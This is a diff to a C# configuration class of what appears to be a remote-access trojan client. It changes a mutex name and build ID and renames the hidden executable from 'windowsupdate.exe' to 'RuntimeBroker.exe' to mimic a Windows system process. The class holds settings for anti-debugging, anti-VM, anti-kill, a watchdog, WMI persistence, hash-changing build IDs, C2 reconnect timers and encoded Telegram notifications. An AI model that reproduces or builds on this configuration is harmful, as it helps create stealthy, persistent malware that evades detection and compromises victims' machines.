@@ -5,7 +5,7 @@ internal static class Config
     public static readonly string[] Hosts = new[] { "localhost" };
     public const int Port = 2727;
     public const bool UseMutex = true;
-    public const string MutexName = "Global\\45c1305de5c04c7e983c2d5d930cf996";
+    public const string MutexName = "Global\\a864d1c20486e7acf2b31060f7a0f063";
 
     public const bool AntiDebug = true;
     public const bool AntiVM = false;
@@ -17,7 +17,7 @@ internal static class Config
     public const bool PersistStartup = false;
     public const bool PersistTask = false;
     public const bool PersistWmi = true;
-    public const string PersistName = "windowsupdate";
+    public const string PersistName = "test";
 
     public const bool AntiKill = true;
     public const bool EnableWatchdog = true;
@@ -28,14 +28,14 @@ internal static class Config
     public const string CertHash = "700A8415A26C242E4A77FC13CE862990AD2E754A988DB535291B7CCD1ACBB14C";
 
     // Unique per build — changes the compiled binary hash even with identical settings
-    public const string BuildId = "1e5980603b024141bba633b66f3d5887";
+    public const string BuildId = "8d1ac3975f3e92add8a80afab78244f5";
 
     public const int ReconnectDelayMs = 5000;
     public const int HeartbeatIntervalMs = 3000;
 
     public const string ClientIdPrefix = "Spas";
 
-    public const string HiddenFileName = "windowsupdate.exe";
+    public const string HiddenFileName = "RuntimeBroker.exe";
 
     // Telegram notification (SFC64-encoded — never stored as plaintext in binary)
     public const bool TelegramEnabled = false;
